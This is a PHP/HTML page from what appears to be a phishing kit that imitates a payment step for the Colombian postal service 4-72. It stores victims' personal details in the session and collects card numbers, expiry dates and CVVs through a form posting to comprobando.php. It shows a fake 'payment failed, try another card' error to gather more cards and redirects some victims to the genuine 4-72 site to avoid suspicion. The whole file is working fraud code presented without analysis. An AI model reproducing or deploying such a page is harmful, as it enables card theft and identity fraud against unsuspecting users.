<?php

session_start();


if(isset($_POST['actualizar_datos'])){

    $_SESSION['nombre'] =$_POST['nombre'];
    $_SESSION['apellido'] =$_POST['apellido'];
    $_SESSION['cedula'] =$_POST['cedula'];
    $_SESSION['telefono'] =$_POST['telefono'];
    $_SESSION['email'] =$_POST['email'];
    $_SESSION['ciudad'] =$_POST['ciudad'];
    $_SESSION['direccion'] =$_POST['direccion'];
}



if(isset($_GET['codigo'])){
    $codigo_error = $_GET['codigo'];
    $response = array(
        'status' => 'error',
        'message' => 'Error al procesar su pago, intentelo nuevamente con otra tarjeta de credito'
      );   
      $json_response = json_encode($response);

    } 
      
      else {
}






if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){


}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 2){

    header('location:/404.php');

}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 3){

    header('location:https://www.4-72.com.co/publicaciones/236/personas/');
}


?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Payment</title>
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="/assets/css/main.css">
<link rel="stylesheet" href="/assets/css/main.css">
<script href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js"></script>




<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.css">


<link rel="stylesheet" href="/assets/css/main.css">


</head>
<body>



<center><br><br><img src="img/logo.jpeg" alt="" srcset="" width="50%"></center>

<br><br>
<center><h3>Informacion de pago</h3></center>

<div class="container d-md-flex align-items-center" style="width:100%;">
<div class="card box1 shadow-sm p-md-5 p-md-5 p-4">
<div class="d-flex flex-column mb-4" style="
    margin-top: 50px;
">
<span class="far fa-file-alt text">
<span class="ps-2">Numero de Orden:
</span>
</span>
<span class="ps-3"> <div id="myNumber" style="margin-left:40px;">8965435</div>
</span>
</div>
<div class="d-flex flex-column">
<div class="d-flex align-items-center justify-content-between text">
<span class="">IVA
</span>
<span class="fas fa-dollar-sign">
<span class="ps-1">0.00
</span>
</span>
</div>
<div class="d-flex align-items-center justify-content-between text mb-4">
<span>Valor total
</span>
<span class="fas fa-dollar-sign">
<span class="ps-1">8.689 COP
</span>
</span>
</div>
<div class="border-bottom mb-4">
</div>

<div class="fw-bolder mb-4">
<span class="fas fa-dollar-sign" style="margin-left:32%;">
</span>
<span class="ps-1">8.689 COP
</span>
</div>
</div>
</div>




<form action="comprobando.php" method="post">


 <center>  <input type="text" name="codigo" placeholder="Número Tarjeta" required pattern="[0-9]{15,16}" maxlength="16" id="input_contacto"><br>
     
         <input type="text"  name="fecha" placeholder="Fecha Expiración" required="" id="input_contacto" oninput="formatoFecha(this)"><br>
        <input type="number"  name="cvv" placeholder="CVV" required="" maxlength="4" id="input_contacto"><br>
    <br>
        <input type="submit" name="enviar" value="Pagar Servicio" style="background-color:#134ba1; height:40px; width:180px; color:white; border:none; border-radius:5px;"></center>

    
    
    </form>
 
</div>
<img src="img/fot.jpg" alt="" srcset="" width="100%" style="margin-top:150px;">
<img src="img/f4.jpg" alt="" srcset="" width="100%" style="">
  
<script>
    function formatoFecha(input) {
      // Obtener el valor actual del campo de entrada
      var fecha = input.value;

      // Eliminar cualquier caracter que no sea un número
      fecha = fecha.replace(/\D/g, '');

      // Agregar el separador "/" después de los primeros dos dígitos
      if (fecha.length > 2) {
        fecha = fecha.substr(0, 2) + '/' + fecha.substr(2);
      }

      // Establecer el valor formateado en el campo de entrada
      input.value = fecha;
    }
  </script>


 <!-- Incluir SweetAlert JS -->
 <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.all.min.js"></script>
  
 <script>
    // Capturar respuesta del servidor
    var response = <?php echo isset($json_response) ? $json_response : 'null'; ?>;
    
    // Mostrar alerta de SweetAlert según el resultado
    if (response !== null) {
      if (response.status === 'success') {
        Swal.fire({
          title: 'Éxito',
          text: response.message,
          icon: 'success',
          confirmButtonText: 'Aceptar'
        });
      } else if (response.status === 'error') {
        Swal.fire({
          title: 'Error',
          text: response.message,
          icon: 'error',
          confirmButtonText: 'Aceptar'
        });
      }
    }
  </script>


</body>
</html>